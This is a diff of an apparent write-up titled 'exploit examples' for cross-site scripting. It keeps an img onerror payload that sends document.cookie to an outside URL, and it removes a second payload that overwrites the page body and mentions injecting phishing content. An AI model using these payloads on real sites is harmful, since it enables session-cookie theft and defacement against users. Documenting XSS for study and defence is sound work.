@@ -59,7 +59,3 @@ Here are some exploit examples:
 
 - Get cookies:
 &ltimg src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;"&gt
-
-- Modify website content:
-You can inject any phishing page, malicious page, or any other content to the website using XSS, by:
-&ltimg src="x" onerror="document.body.innerHTML = 'Website is hacked';"&gt
